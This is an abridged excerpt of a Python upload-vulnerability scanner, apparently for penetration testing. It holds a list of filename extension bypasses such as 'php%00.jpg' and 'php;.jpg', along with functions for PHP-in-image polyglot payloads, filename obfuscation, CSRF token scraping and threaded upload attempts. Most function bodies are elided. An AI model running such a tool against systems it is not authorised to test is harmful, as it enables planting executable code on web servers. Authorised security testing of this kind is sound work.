...
DEFAULT_EXTENSIONS = [
    ...
    "php.jpg", "php.png", "php.gif", "php;.jpg", "php%00.jpg",
    "php..jpg", "php.", "pHp", "PhP"
]
POLYGLOT_TEMPLATES = {
...
def interactive_hex_edit(original: bytes, desc: str) -> bytes:
    """Interactive hex editor for manual payload modification."""
    print(Fore.CYAN + f"\n--- Interactive Hex Editor for: {desc} ---")
    print(Fore.YELLOW + f"Current size: {len(original)} bytes")
    print(Fore.YELLOW + "Commands: v (view hex), e (edit hex), r (replace), a (append), p (prepend), s (save), q (quit without changes)")
    ...
    while True:
        ...
        if cmd == 'v':
            ...
            hex_str = input("New hex (space allowed): ")
...
def generate_polyglot(payload: bytes, poly_type: str) -> bytes:
    """Embed PHP payload into a valid image/PDF/PHAR polyglot."""
...
def obfuscate_filename(original: str) -> str:
    """Apply obfuscation techniques to filename."""
...
def get_csrf_token(url: str, session: requests.Session, csrf_patterns: List[str]) -> Optional[str]:
    """Fetch page and extract CSRF token using common patterns."""
    try:
...
def test_upload(
    ...
    """Perform upload with optional CSRF token injection."""
    if headers is None:
        headers = {}
...
class UltimateUploadScanner:
    ...
    def load_payloads(self) -> List[Tuple[str, bytes]]:
        payloads = []
    ...
    def apply_hex_mods(self, data: bytes) -> bytes:
    ...
    def run(self):
        ...
        total_tests = len(extensions) * len(payloads) * (1 + (self.args.obfuscate))
        print(Fore.CYAN + f"[*] Total tests: {total_tests}")
        print(Fore.CYAN + f"[*] Threads: {self.args.threads}")
        
        tasks = []
        for ext in extensions:
            for payload_desc, raw_content in payloads:
                if self.args.obfuscate:
                    obf_ext = obfuscate_filename(f"test.{ext}")
                else:
                    obf_ext = f"test.{ext}"
                tasks.append((ext, payload_desc, raw_content, obf_ext))
    ...
    def single_test(self, task):
        ext, payload_desc, content, filename = task
